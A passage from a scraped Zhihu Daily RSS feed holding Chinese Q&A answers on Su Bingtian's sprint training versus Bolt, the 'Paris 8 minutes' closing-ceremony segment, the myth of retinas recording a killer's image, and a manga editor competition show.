src=\"https://pic1.zhimg.com/v2-5f64421c7372df2eee0c2263ecfea373_720w.jpg?source=8673f162\" alt=\"\"></figure><p>可以看到，博尔特的确是在山巅之人，人类在 9.8 秒以内的成绩一共有 43 次，其中有 12 次是由博尔特跑出来的。但博尔特是属于那种出场即巅峰的类型，在 2009 年（23 岁）刷新世界纪录之后，博尔特的成绩随着年龄快速下滑。2017 年（31 岁），博尔特在伦敦世锦赛中获得第三名，只跑出 9.95 秒的成绩，随后便宣布退役。</p>\n<p>博尔特为什么成绩出现下降呢？研究人员也专门写了一篇论文：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-ee4de11bb81fc6916ca895ce7f4d1bf3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>上面只是摘要，具体原因很多，比如研究人员仔细计算了博尔特着地瞬间和垂直支撑阶段的支撑腿膝角，发现 2009 年为为 160.1°和 140.8°，膝角变化幅度达到 19.3°，而 2017 年变化幅度为 14.4°。</p>\n<p>为什么这两个角度很重要？因为「着地瞬间与垂直阶段膝角变化幅度大，说明肌肉退让工作更加积极，做功时间更充分，激活的横桥数量增多，肌肉储存的弹性势能更多，后续的蹬离速度也就越快」……</p>\n<p>呼吸频率、髋角、每秒步长、触地时间、腾空时间……每一个技术细节都被拿来研究，并内化到特定的训练中来，这才有了不断的提高。</p>\n<p>如果我们将苏炳添和博尔特相比，那么在 23 岁刷新世界纪录后成绩不断下滑，并在 31 岁宣布退役的博尔特，固然是创造了更强的巅峰成绩，但 22 岁到 32 岁成绩仍在上升并达到了 9.83 秒的苏炳添，才更能让人看到希望。</p>\n<p>这种希望，不止是中国人在黑人统治的短跑领域中撕开了一角——人种论之说，那是在出生时即告胜负。博尔特一出生就浑身上下适合短跑，那么我们是不是只能指望下一个浑身上下都适合短跑的运动员来破纪录呢？显然不是。</p>\n<p>苏炳添走出的这一条在 22 岁之后逆势增长的速度曲线，更大的意义在于告诉我们另一个事实——短跑的技术，远没有达到至臻至善的程度，还有潜力可挖。</p>\n<p>以往黄种人在短跑上始终难以在成绩上有大的突破。一些优秀的年轻运动员，比如给自己加量训练的桐生祥秀，却始终在十秒大关附近徘徊，偶尔破 10 秒，但又在许多比赛中拉胯。为什么？难道真的是因为人种吗？</p>\n<p>苏炳添告诉我们，不是因为人种问题，而是训练方法的问题。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-5c9a68c0ea263ba99e6f590f57afb740_720w.jpg?source=8673f162\" alt=\"\"></figure><p>上图列出了中国选手在各项比赛中的成绩。可以看到，从 1985 年到 2013 年，中国的 100 米最好成绩始终难以突破 10 秒 2，10.16 秒的全国记录竟然保持了 17 年。</p>\n<p>而在 2014 年之后，运动员们的成绩却突然好转了，各项接近 10 秒、破十秒的成绩每年都在出现。直到最近达到 9.83 秒。</p>\n<p>2014 年之后，出现了什么？显然变的并不是人种。在苏炳添的另一个访谈中，可以找到答案：</p>\n<blockquote>当时很多人都不明白，为什么苏炳添你现在成绩都这么好了、技术已经很成熟了还要改变技术？因为对他们来说可能想要保守的方式，但对我来说是想挑战个人的极限。所以哪怕是失败或成功我都想尝试一下。<br>我是在 2014 年的 5 月份左右有了这个想法，也询问过很多人，最终让我决定改变的是李金哲的外教 Landy。他给我做了个测试，在我没有防备的时候在我身后推了我一下。看到我迈出去的第一步是右脚，他就说我可以改过来。他说为什么我之前要把右脚放在前面，蹬出去的第一步是左脚呢？这是不符合规律的，改过来才是神经自然的反应。我听后觉得非常对，所以就决定改变过来。</blockquote>\n<p>这名外教 Landy，也就是苏炳添现在的主管教练兰迪亨廷顿。</p>\n<p>兰迪在 2013 年被聘请成为了中国田径队的教练，他同时也是其他多位短跑及跳远名将的指导教练，包括三级跳远银牌朱亚明和女子 800 米王春雨。兰迪，以及他背后的一系列研究团队，比如在上文引用的几篇文章的作者，一同改进了中国田径的训练方式。</p>\n<p>从内因上，首先是需要苏炳添的挑战，他不相信人种的限制，他想要挑战个人极限。</p>\n<p>从外因上，针对苏炳添，以及和他一样的运动员们，研究人员和教练员找到了一套行之有效能够提高成绩的训练手段。</p>\n<p>虽然只是短短 10 秒不到的比赛，但这种技术的进步、对于特定顶尖运动员的专项训练，一样能够跨越人种和年龄的限制，突破自己的极限，甚至突破人类的极限。</p>\n<p>如果博尔特让我们看到了人类目前的最快速度，那么苏炳添则让我们看到了如何通过技术和训练的改进获得超越人种和年龄的上升空间。</p>\n<p>正因为苏炳添，我们才更加相信，人类的速度，决不会在博尔特的记录处止步。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/282501143\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739065"},{"title":"如何评价东京奥运会闭幕式上的「巴黎 8 分钟」环节？","date":"2021-08-10 23:08:09","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-454b6164fd8166f3d77bd67655457efb_l.jpg?source=8673f162\"><span>於文漪，</span><span>中文系毕业的综艺导演 戏剧青年在路上 戏剧合作请私信</span>\n<a href=\"https://www.zhihu.com/question/478248663/answer/2049040409\" hidden>阅读原文</a>\n</div>\n<div>\n<p>从<strong>音乐，空间和视觉语言</strong>几个角度来说说为什么“巴黎八分钟”这场秀能表现得又年轻，又酷，又具有浪漫的人文气息。</p>\n<p><strong>音乐与空间的共振</strong></p>\n<p>这次“巴黎八分钟”的音乐总监是我非常喜欢的法国秀导 Woodkid，他非常擅长将音乐视觉化，Katy Perry 的 Teenage Dream，打雷姐的 Born to die，哈卷的 Sign of the times 这些传播度超高的 MV 都是出自他手。</p>\n<p>而这次，他用分布在不同地方的交响乐团来完成的《马赛曲》，不仅将乐感融入视觉语言的表达，也将音乐的空间感做了非常精彩的表达。</p>\n<p>开头女性音乐家在法兰西体育场屋顶吹奏长笛总起，<strong>长笛</strong>的音色是非常清亮，悠扬的，笛声仿佛从高点绕场一周，尔后一路飘扬向上，飞入云霄。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-15d37957aa98e3051df3e6fc3360001a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-3a1d522ffb05dd896609d086f7cfd776_720w.jpg?source=8673f162\" alt=\"\"></figure><p>巴黎中心的塞纳湖畔，一组音色非常接近人声的<strong>小提琴</strong>随流水的波动奏出赞歌。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-5589580504167b44eaa49f420c014dd4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>回到卢浮宫，两组音色空灵的<strong>马林巴琴</strong>把整个圣洁博大的空间充满。同时，马林巴琴其实是一种发源于非洲的民族乐器，在近年也有不少当代音乐家会把它和古典乐团编到一起。它的出现也是向法国庞大的非裔族群的一个致意。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5fa73efb459beb5a6674be34032b6a83_720w.jpg?source=8673f162\" alt=\"\"></figure><p>乐曲层层递进，一位钢琴家出现在废弃的铁轨前。这个地方其实是巴黎的一处旧城改造项目，从废弃的 Petite Ceinture 内环铁路，（感谢评论区知友 <a href=\"http://www.zhihu.com/people/0d002423417bbae9c3e7d33be4817e7a\">@Enzo Jiang</a> 更正补充：这段内环铁路大概废弃了一百年了，最近十几年确定不会再要之后开始慢慢改造成其他市民项目）改为了以“DIY”为核心的人文艺术中心，这里可以举办各种艺术工作坊，集会，电影放映等。这个场景的出现也是奥委会对“环保”观念的一个考量。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-27cee16cb91c2e491cbe06becf7bd498_720w.jpg?source=8673f162\" alt=\"\"></figure><p>该场地实拍图：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-178661ad5ccd515460553fb9780c662f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-4b665682a86d35592024301def8b86ec_720w.jpg?source=8673f162\" alt=\"\"></figure><p>随着打击乐的进入，镜头切换到巴黎著名的滑板公园（The Diderot Skatepark），滑板落地声也组成鼓点的一部分。滑板这种源于街头，现在也被纳入奥运会项目的运动，非常适合展示当代年轻人的体育和都市文化。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5eb599b48c53ff9d5b1836902e2edf4c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>同时镜头扫过每个乐组，所有乐器一同加入演绎，像整个市民的共同唱和，整个城市仿佛被音乐充盈，旋律逐渐走高，直至镜头上摇推至天空……</p>\n<p>太空中，宇航员 Thomas Pesquet 用<strong>萨克斯风</strong>独奏《马赛曲》最后一段。萨克斯风的音色像人的低吟，常常用来表现孤独感，<strong>但这太空中的遥望，既有一种宏大又细腻的 homesick，也蕴藏着人类进步的使命感。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-74520d2b470f153af3ed1757b3a4ac17_720w.jpg?source=8673f162\" alt=\"\"></figure><p>Thomas 望向地球，日出的光辉初现，像萨克斯风上滚过的金属光辉。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4138adf3c3c06cbf3aa62ff4bec99bb2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-2aa2841d3f822e55ea388bd5fcd7328e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>到这里，这场音乐会的空间感已经拉到了无垠的宇宙。</p>\n<p><strong>果然是《马赛曲》，一定是《马赛曲》</strong></p>\n<p>开场的音乐选择了《马赛曲》真是毫不意外。坦白讲，《马赛曲》可能是最为全球人民熟知的国歌之一，其地位可以说仅次于《国际歌》了。这不仅因为它优美的旋律，还因为它所歌颂的历史就是人民的自由斗争史。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-54fe2c1e6a92174311873e4911b8fcfb_720w.jpg?source=8673f162\" alt=\"\"></figure><p>尽管几度失去国歌地位，但总是被“复辟”，还曾被填上俄语词“借”为俄国国歌，可见它对全世界革命精神的推动。</p>\n<p>它生于革命，歌颂自由，永恒地歌颂着自由。</p>\n<p><strong>前卫魔咒：当代的新镜头语言</strong></p>\n<p>也许是疫情的缘故，“巴黎八分钟”没有采用我们想象中秀感很重的现场大方阵，大队列来表演，而是用很多的镜头加剪辑语言来呈现，但这也是一个讨巧的做法，在视觉的炫酷呈现之外，更可以向诞生电影的法国致敬。</p>\n<p>第二部分由小轮车运动员总领镜头，在城市上空穿梭，概览了整个巴黎。这一部分主要展现现代巴黎都市的前卫，活力。其中多处用到了高速运动镜头 +slow motion 特写 + 大广角的组合，让这段高空跑酷动感十足。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c85ab1617b3577b2a0ca4df73361be09_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-be03ef48ce0b41b0e9db6cb973b3e299_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这一幕让人想到了电影《雨果》，这也是一部向所有电影人致敬的影片。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b4078a4d232d8f50bf689c03f8a1449c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-a4f25fd2dca86eb812fb3facafe5bff3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这个由近景拉到高空的快速镜头剪辑相当帅气。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-dfd467067b1d74b1e55720c387c70520_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-888b8d8199a8a958f856960a5ae3398f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>还用到了手机镜头</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-01042fbdb240686890384167ba5ab78e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>画面结构也很棒，通过建筑屋顶上下动态中的透视，把金属和线条演绎得很有流动感，特别喜欢轮椅击剑运动员的这一段。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-16ffce77a628e130d3587565a0b344a6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-0eee71723616049f60aef7af73f97f2b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>镜头的仰视角度，让女性运动员的形象颇具力量感</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-297b3e43b841d08c960d57f837679b44_720w.jpg?source=8673f162\" alt=\"\"></figure><p>为了表现“城市”的主题，片子多次出现了街舞 Breaking 的表演。Breaking 是最 old-school 的街舞舞种之一，也叫地板舞，现在也已成为奥运会项目，是非常展现力量感和技巧性的一个舞种，舞者给人的观感仿佛在不断抵抗地心引力。在街舞领域，法国街舞舞者也确实是有着极强的统治力，妥妥的街舞大国。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c00d29e4d020356ce09069401820d656_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这里围观的群众也做出了地道的街舞文化喝彩手势——“给手”。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1925a09444b86e839a282b2c0f66a0da_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>伟大的女性群像</strong></p>\n<p>正如巴黎奥运的会徽一样，女性是这场秀格外突出的主角。虽然这场秀的导演组均为男性，但在整场秀中我们不断看到女性运动员、艺术家、人民的特写。</p>\n<p>值得一提的是，传统的古典乐演奏时，女性音乐家大多会着礼服裙演奏，但是这条片子中她们都穿上了西装。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-15d37957aa98e3051df3e6fc3360001a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-1d446686facaa141d3b7acf2a0f8b5ff_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-31744f7771a0cf49c18d803da7e120b2_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong> 在这些特写下，女性坚毅，热情，健美。</strong></p>\n<p><strong> 正如东京奥运会中杰出女性们所绽放的光芒，浴过《燃烧女子的肖像》之火后，奥运精神又为女性平权加上一簇圣火。</strong></p>\n<p>法国奥组委对开幕式的官方评价是：“Monuments seen from the sky reveal unexpected contours; sport and heritage merge together as one; the street shakes to the sound of strings and percussion; a wind of freedom flows through every movement. In this collective performance, Paris is transformed into an open-air festival of sport.”</p>\n<p>我想完成得还是非常出色的。</p>\n<p>那就一起期待下一届奥运盛会吧！^_^</p>\n<p>参考：</p>\n<ol>\n<li><a href=\"http://link.zhihu.com/?target=https%3A//www.paris2024.org/en/\" target=\"_blank\" rel=\"nofollow noreferrer\">Paris 2024 makes its entrance !</a></li>\n<li><a href=\"http://link.zhihu.com/?target=https%3A//www.dailyadvent.com/fr/news/7102ec649d1138141780be9ab9cc3cba\" target=\"_blank\" rel=\"nofollow noreferrer\">Visite-conférence sur la Petite Ceinture à la REcyclerie La Recyclerie La Recyclerie samedi 3 juillet 2021</a></li>\n<li><a href=\"http://link.zhihu.com/?target=https%3A//www.pariszigzag.fr/balades-excursions/balade-paris/les-meilleurs-spots-de-la-petite-ceinture\" target=\"_blank\" rel=\"nofollow noreferrer\">Les meilleurs spots de la Petite Ceinture</a></li>\n</ol>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/478248663\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739057"},{"title":"现实中警察真的能通过死者眼球记录下的影像破案吗？","date":"2021-08-10 23:08:05","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-ff194198578194e1c47521e7fbea5ac4_l.jpg?source=8673f162\"><span>Moriarty K，</span><span>正常合作请私信，洗稿白嫖劝收手。</span>\n<a href=\"https://www.zhihu.com/question/478361434/answer/2048561025\" hidden>阅读原文</a>\n</div>\n<div>\n<p>或许大家都知道这是一个经久不衰的经典都市传说，但很少有人知道这并非空穴来风，而是经过很多生理学家、法医学家进行的一系列科学实践研究，最终方才被抛弃的。</p>\n<p>首先不得不提一提，“视网膜破案”的影响力确实不小，以至于很多<strong>文化程度比较低</strong>的凶手真的信以为真，做贼心虚的在杀人后实施附加行为，把受害人眼睛挖去，这种做法的意义只能是强行为自己加上个侮辱尸体的罪名。</p>\n<p>回到问题本身，我们首先必须知道，<strong>眼睛是如何正常工作的</strong>。</p>\n<p>这是一个眼结构：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c08dedf0f49f0b050f0180fc6355eb7b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>如图，光线依次经过角膜、虹膜中央的瞳孔、晶状体、玻璃体，<strong>在视网膜上成像</strong>，视觉细胞的兴奋经过视神经传递到<strong>大脑皮层的视觉中枢</strong>，最终形成视觉。</p>\n<p>在这整个过程中，无论是瞳孔还是视网膜，都仅只是一个<strong>短暂的中点站</strong>，产生影像最为关键的是其过程中产生的电信号传递，<strong>没有任何一个单一结构能够做到记录储存画面</strong>。</p>\n<p>所以，人死了，这一系列刺激传递过程是被中断的，自然无法达到“记录”的效果。</p>\n<hr>\n<p>在基本了解完这些基本点之后，我更想说的是这个都市传说背后一些可信的地方。</p>\n<p><strong>一.在过去，一些法医学家确实研究过这种破案方法</strong></p>\n<p>optography，大致意思是“<strong>视网膜图像还原</strong>”，在二十世纪初曾经是一个小型学科，研究点就在于通过视网膜来“还原最后一刻看到的事物”，其原理在于视网膜上面的两种感光细胞：</p>\n<p>——视锥细胞（Cone Cell)和视杆细胞(Rod Cell)</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-53a24bcf504c2dde1e8624ad9ce6205a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>简单来说，这两者的工作主要是接受传递过来的光刺激，将其转化为神经冲动，<strong>充当光感受器的作用</strong>，视杆细胞中有一种视蛋白叫做“<strong>视紫质</strong>”，在光下起色觉作用，<strong>对光极其敏感，遇到光就褪色，而在暗处会慢慢恢复。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e763cb68b1122d81a71e36ab622e3531_720w.jpg?source=8673f162\" alt=\"\"><figcaption>视紫质全称“视网膜紫质”（Rhodopsin)，呈红紫色并因此得名（平行于细胞膜）</figcaption></figure><p>基于这一点，研究者认为<strong>虽然视网膜不具备存储的能力，但由于视紫质这种特殊的机制，通过观察其褪色情况，可以对死前一刻的环境情况进行一些基本判断。</strong></p>\n<p>研究者做了三组实验，首先准备三只兔子：A、B、C</p>\n<p>让 A 处于一件小黑屋里，然后杀掉它，并立刻记录视网膜画面。</p>\n<p>让 B 处于一个拱形窗前，然后杀掉它，并立刻记录视网膜画面。</p>\n<p>让 C 处于一个方形窗前，让后杀掉它，并立刻记录视网膜画面。</p>\n<p>这三组实验的效果还不错，因为确实<strong>记录下了窗户的轮廓</strong>：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-929f2fb4966f6c64c2fd1e1396d13950_720w.jpg?source=8673f162\" alt=\"\"><figcaption>从左到右依次是 A 兔、B 兔、C 兔</figcaption></figure><p>但是研究人员很快就意识到，这个技术有着一些致命的缺陷：</p>\n<p>——视紫质的<strong>光感变化过程虽然明显，但是时效太短</strong>，若非死后短时间内记录，那就毫无意义。</p>\n<p>——视紫质<strong>虽然可以对光暗情况进行反馈，但也局限于此</strong>，基于此技术不能做到人们想象中那样的“拍照”水平，<strong>只能对环境明暗对比做出提示</strong>，作用太过于有限。</p>\n<p>这两个缺陷，让 optography 的实际运用化为泡影，因为警察不可能每次出命案就瞬间移动到案发现场，更别说得到的大概率也不是足够破案的提示信息。</p>\n<hr>\n<p>虽然眼睛无法记录下凶手的相貌等细节，但眼睛对于法医学依旧有着极其重要的作用，这也是为什么很多时候能看到法医翻开死者眼睛检查的原因。</p>\n<p>顺手科普一下：</p>\n<p><strong>1.提取玻璃体，判定死者死亡时间</strong></p>\n<p><img src=\"https://www.zhihu.com/equation?tex=K%5E%7B%2B%7D\" alt=\"\"></p>\n<p>作为人体细胞内液的主要阳离子，其浓度一般较为稳定，人在死亡后细胞通透性改变导致大量钾离子外涌，在眼结构内<strong>主要流动方向就是玻璃体。</strong></p>\n<p>于是，<strong>死亡时间越长，玻璃体内钾离子浓度就越高</strong>，提取死者玻璃体，对其中钾离子浓度进行分析，可以大致判断死亡时间。</p>\n<p><strong>2.角膜混浊度，判定死者死亡时间</strong></p>\n<p><strong>尸体角膜混浊</strong>（Postmortem turbidity of cornea）是一种常见尸体现象，人死后<strong>粘多糖水和作用受阻，导致角膜透明度下降，变混浊至灰白色。</strong></p>\n<p>通过角膜混浊的程度，可以初步判断死亡时间。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5d2211204576518431e843e32955ff05_720w.jpg?source=8673f162\" alt=\"\"><figcaption>角膜中度混浊，提示死亡 24 小时左右</figcaption></figure><p><strong>3.提取玻璃体，判断死亡原因</strong></p>\n<p>这个一般情况下不太会用，因为毒物检测可以用的东西很多，但某些“特殊情况”玻璃体也行，能用来做毒物检测。</p>\n<p><strong>4.特征性提示</strong></p>\n<p>眼睑结膜出血点能够提示机械性窒息（70％左右）</p>\n<p>有机磷中毒死亡，一般瞳孔会缩得很小</p>\n<p>巩膜黑斑，提示尸体在干燥环境中存放过一定时间</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-da1473d7deff177dc844c65cd0bb6d95_720w.jpg?source=8673f162\" alt=\"\"><figcaption>巩膜黑斑</figcaption></figure><p>相关：</p>\n<p><a href=\"https://www.zhihu.com/question/276477077/answer/1242103065\">死不瞑目从法医学的角度来说应该如何解释？</a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/478361434\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739074"},{"title":"如何评价集英社的编辑X漫画家节目 million tag?","date":"2021-08-10 15:30:09","description":"\n<p>暂时没什么人写，我来自问自答一下吧。</p>\n<p>我觉得漫画的绘制过程是比较枯燥和耗费精力的过程，和编辑的洽谈也并不一定会那么有趣。所以搞这么个类似爆漫王的活动，我本来是不特别看好的。而且哪有说刚看个漫画开头，还没开始连载，就决定动画化了？这绝对是最速动画化了吧。所以我对这个综艺其实是有一丝怀疑态度的。</p>\n<p>实际上，这个活动1-6期的油管视频，各话的播放数分别是：第一话：31w；第二话：14w；第三话：43w；第四话：14w；第五话：9.3w；第6话目前：14w。参考，jump油管大概目前300个视频出头，100w以上播放数的13个、50-100w的视频21个、30-50w的视频20个、20-30w的视频24个、10-20w的视频40个，所以算是，马马虎虎吧；或者说，是个“实验性质”的节目。</p>\n<p>不过这个节目还是很有意思的，比如里面提到的水之呼吸名字的由来是编辑的决定；贺来和三浦的对谈；境界触发者短篇的情节拆解；等等等等，从这方面来说，这个节目还是有一些收获的。</p>\n<p>其中1，2期的奖励和2期的辅助，分别是：藤本树的电话，远藤达哉的信件，贺来友志的对谈；而电锯人，间谍过家家，地狱乐这三部漫画，都是将要动画化的作品，所以以jump+为主体的这个节目，明显也承担了部分这三部作品的宣传工作。因此个人推测，第三轮冠军的奖励，大概是怪兽八号的作者：松本直也的解惑，你两周一更，还是有时间搞这个的吧。</p>\n<p>主持人们不说了，樱小姐真可爱。（竟然这么多期节目都没换衣服，出乎我意料，记得我看投石台里面她几乎就没穿过相同的衣服。）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-be6bfbd55a9bf225229e97ec93df716c_720w.jpg?rss\" data-rawwidth=\"350\" data-rawheight=\"410\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-be6bfbd55a9bf225229e97ec93df716c\" data-watermark-src=\"v2-776d4659084535d12bfd95db37117bef\" data-private-watermark-src=\"v2-57b58c9b7b3f9b5ee1278773dee8a470\"></p>\n<p>编辑x漫画家阵容，<b>林</b>不用说了，从前面藤本树贺来友志远藤达哉就可以看出来吧，这全是林做的编辑，也是jump+最能打的作品，他明显非常注重漫画家自身的“输入工作”，所以其他人都开始画了，他们组总是：先花一周看各种书籍，漫画，电影，等等，然后再动手，非常稳健。分镜对门开合的修改，对整个剧本的改善，都一语中的，林编辑真是强。搭档的漫画家是个很有意思的人，年龄是六组中最大的，画风我也相当喜欢，有种“魔性”。每轮的故事也都挺有意思，不过第三轮的那个战斗漫画，虽然挺乐呵类似间谍过家家，但真的距离“异能力战斗”差的好远啊...估计真的不擅长这类吧。我个人也是觉得这组是最稳的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-74752883d4b27eb6e9f0aa5c96b25341_720w.jpg?rss\" data-rawwidth=\"466\" data-rawheight=\"399\" data-size=\"normal\" data-caption=\"看藤x树 这三轮里面的女性设定和分镜，似乎都有黑发女性和这样的角度\" data-watermark=\"original\" data-original-src=\"v2-74752883d4b27eb6e9f0aa5c96b25341\" data-watermark-src=\"v2-0f228584323d6d536814a8bb4fcd7775\" data-private-watermark-src=\"v2-0794f656e6071c5020c083b05769f57e\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-bef9d6e61e1c56900ee340ae971ac7f1_720w.jpg?rss\" data-rawwidth=\"521\" data-rawheight=\"720\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-bef9d6e61e1c56900ee340ae971ac7f1\" data-watermark-src=\"v2-4ff1f29a72dcd70609333452e325e4d1\" data-private-watermark-src=\"v2-4c6fc22e6704cafdb747936cc402f2a4\"></p>\n<p><b>玉田</b>个人是觉得真不行...前两轮把小姑娘心理都有点搞崩了，不知道他到底再做些什么，心理起伏太大了。第一轮那个四格，看到第一页就能猜到最后一页。我记得第一轮的标准大概是“反转，震惊感”之类的，这作品怎么拿的出来嘛。第二轮心态完全就崩了，看画面就看的出来。第三轮虽然是她擅长的战斗漫画，但个人觉得那个作品拿前三可以，拿第一还有点牵强...和第一轮一样，这位漫画家对漫画角色的情感拿捏的不太行，情感变化的有些突兀...所以我认为这<b>肯定是有剧本的成分在里面</b>...</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a7647bdac4c4f0ea06e4d64f08541257_720w.jpg?rss\" data-rawwidth=\"523\" data-rawheight=\"741\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a7647bdac4c4f0ea06e4d64f08541257\" data-watermark-src=\"v2-89e224a08559c1812ae31c40dbe488e0\" data-private-watermark-src=\"v2-d6a4b458a5af8526ec9cd5fac5a66016\"></p>\n<p>对<b>冈本</b>没什么印象...可能是这组的漫画家点子太多了所以忽视了...但是每轮这组呈现出来的作品我都很满意，和林那组并列是我最喜欢的。第三轮的魔法少女回家，虽然故事和怪兽八号有些像，有的地方的分镜我觉得有点问题，但依旧是我最喜欢的作品，第二轮的CO2也不错。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-21f8c5d7fa1941e49decd21e361cbf47_720w.jpg?rss\" data-rawwidth=\"524\" data-rawheight=\"806\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-21f8c5d7fa1941e49decd21e361cbf47\" data-watermark-src=\"v2-55b517bb2be70eb102be76a0adcef906\" data-private-watermark-src=\"v2-0e43d48d0f6cfc46b1e7e3bd82e7c1ba\"></p>\n<p><b>李光良</b>这组，是唯一一组三轮排名前三的，搭档的是“性癖猫”。我认为这个编辑还是很有实力的，比如他对异能力战斗漫画的一些坚持：必须要有必杀技；不过性癖猫真的是个非常“坚持自我”的作者，从第一回的换装play，到第二回的摸胸，第三回的体液交换，她的每部作品都非常有自己个人的风格。不过似乎这组编辑和作者是相对最针锋相对互相争论的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7636be340733cb0b143585362b33c6ed_720w.jpg?rss\" data-rawwidth=\"528\" data-rawheight=\"751\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7636be340733cb0b143585362b33c6ed\" data-watermark-src=\"v2-87a03759b1e43da8a1dfad644776f515\" data-private-watermark-src=\"v2-a66c6306b1bae336b98457b6e3863f9b\"></p>\n<p><b>双女性</b>这组，关系应该是最融洽的，可能是两个人兴趣很相近吧。第二轮编辑帮忙找自己同学进行话剧社的取材这点，可以看出还是很尽职尽责的。其他没有什么特别想说的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6eba89de4d1e4d4c43aa837d1654decc_720w.jpg?rss\" data-rawwidth=\"525\" data-rawheight=\"736\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-6eba89de4d1e4d4c43aa837d1654decc\" data-watermark-src=\"v2-4ee29ad42bac045723204d7fb5b6e993\" data-private-watermark-src=\"v2-ed6263f3c63c5654b796a1dfc42f6064\"></p>\n<p><b>浅井</b>这组，虽然我对浅井还是挺有怨念的...毕竟是马修的编辑，而且还各种破事...但是他的确还是做了些事情的...第一回看了大量的四格漫画总结了经验，第三回拆解了触发的那个迅的短篇，这些我觉得做的都不错。不过第一回的故事怎么说呢，感觉恐怖漫画应该是“细思恐极”的，而不是它那种呈现...第二回的故事不太行不说了...第三回应该说，他们组的漫画反倒是最符合“异能力战斗”的。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-78431b945ad61975f1f4d624005db525_720w.jpg?rss\" data-rawwidth=\"509\" data-rawheight=\"724\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-78431b945ad61975f1f4d624005db525\" data-watermark-src=\"v2-1e7232f79a59266146909e27140ce343\" data-private-watermark-src=\"v2-4ac0b261588f609a3b1f28938f8aea07\"></p>\n<p>总之，这个节目我还是觉得挺有意思的，毕竟漫勉就挺有意思的，这应该是另一种展示漫画家与编辑日常生活的方式了。节目时长一期大概也就半个小时以内吧，不过实际上他们第2，3回漫画评比我记得是绘制时间是3周，剪出半个小时，应该还是富裕的。不过我个人还是对直接动画化的决定抱怀疑态度...这真的能行吗...</p>\n<p>大概就这样，溜了溜了。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a 